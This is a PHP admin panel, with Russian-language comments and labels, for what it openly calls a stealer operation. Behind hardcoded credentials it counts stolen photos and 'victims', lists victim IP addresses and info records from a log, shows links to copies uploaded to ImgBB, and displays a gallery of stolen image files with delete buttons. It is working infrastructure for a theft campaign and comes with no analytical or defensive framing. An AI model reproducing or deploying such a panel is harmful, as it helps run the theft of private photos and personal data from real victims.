<?php
// admin.php — просмотр всех украденных данных
$AUTH_USER = 'admin';
$AUTH_PASS = 's3cr3t_p@ss';

if ($_SERVER['PHP_AUTH_USER'] !== $AUTH_USER || $_SERVER['PHP_AUTH_PW'] !== $AUTH_PASS) {
    header('WWW-Authenticate: Basic realm="Admin Panel"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Access Denied';
    exit();
}

$LOG_FILE = 'stolen.log';
$STORAGE_DIR = 'stolen/';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Stealer Admin Panel</title>
    <style>
        * { box-sizing: border-box; }
        body { background: #0a0e27; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff3366; border-bottom: 2px solid #ff3366; display: inline-block; }
        .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin: 20px 0; }
        .log-entry { background: #11152a; margin: 10px 0; padding: 15px; border-left: 4px solid #00ffcc; border-radius: 5px; }
        .log-time { color: #ffcc00; font-size: 12px; }
        .log-ip { color: #ff6666; }
        .log-type { color: #66ff66; }
        pre { background: #000; padding: 10px; overflow-x: auto; font-size: 11px; color: #fff; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 30px; }
        .gallery-item { background: #1a1f3a; padding: 10px; border-radius: 8px; text-align: center; }
        .gallery-item img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 5px; cursor: pointer; }
        .gallery-item a { color: #00ffcc; font-size: 11px; word-break: break-all; }
        .btn { background: #ff3366; color: white; border: none; padding: 5px 10px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #cc0044; }
        iframe { width: 100%; height: 300px; border: 1px solid #333; margin-top: 10px; }
    </style>
</head>
<body>
<h1>🔻 STEALER ADMIN PANEL 🔻</h1>
<div class="stats">
    <?php
    $logLines = file_exists($LOG_FILE) ? file($LOG_FILE) : [];
    $photos = 0;
    $victims = [];
    foreach ($logLines as $line) {
        $data = json_decode($line, true);
        if ($data && $data['type'] === 'photo') $photos++;
        if ($data && $data['type'] === 'victim_info') $victims[] = $data;
    }
    ?>
    <strong>📸 Всего украдено фото:</strong> <?= $photos ?><br>
    <strong>👤 Жертв:</strong> <?= count($victims) ?><br>
    <strong>📁 Логов:</strong> <?= count($logLines) ?>
</div>

<h2>📋 Последние события</h2>
<?php
if ($logLines) {
    $lines = array_reverse($logLines);
    foreach (array_slice($lines, 0, 30) as $line) {
        $data = json_decode($line, true);
        if (!$data) continue;
        echo "<div class='log-entry'>";
        echo "<div class='log-time'>🕒 {$data['time']}</div>";
        echo "<div class='log-ip'>🌐 IP: {$data['ip']}</div>";
        echo "<div class='log-type'>📌 Тип: {$data['type']}</div>";
        if ($data['type'] === 'photo') {
            echo "<div>📷 Файл: {$data['data']['original_name']} → сохранён как: {$data['data']['saved_as']}</div>";
            if ($data['data']['imgbb_url']) {
                echo "<div>🔗 ImgBB: <a href='{$data['data']['imgbb_url']}' target='_blank'>{$data['data']['imgbb_url']}</a></div>";
                echo "<img src='{$data['data']['imgbb_url']}' style='max-width:200px; margin-top:10px;'>";
            }
        } elseif ($data['type'] === 'victim_info') {
            echo "<pre>" . htmlspecialchars(print_r($data['data'], true)) . "</pre>";
        } else {
            echo "<pre>" . htmlspecialchars(print_r($data['data'], true)) . "</pre>";
        }
        echo "</div>";
    }
} else {
    echo "<p>Логов пока нет</p>";
}
?>

<h2>💾 Все украденные файлы (копии)</h2>
<div class="gallery">
<?php
if (is_dir($STORAGE_DIR)) {
    $files = scandir($STORAGE_DIR);
    $files = array_diff($files, ['.', '..']);
    foreach ($files as $file) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'])) {
            $url = $STORAGE_DIR . $file;
            echo "<div class='gallery-item'>";
            echo "<img src='{$url}' onclick='window.open(this.src)'>";
            echo "<div><a href='{$url}' target='_blank'>{$file}</a></div>";
            echo "<button class='btn' onclick='fetch(\"{$url}\",{method:\"DELETE\"}).then(()=>location.reload())'>🗑 Удалить</button>";
            echo "</div>";
        }
    }
}
?>
</div>

<script>
setInterval(() => location.reload(), 30000);
</script>
</body>
</html>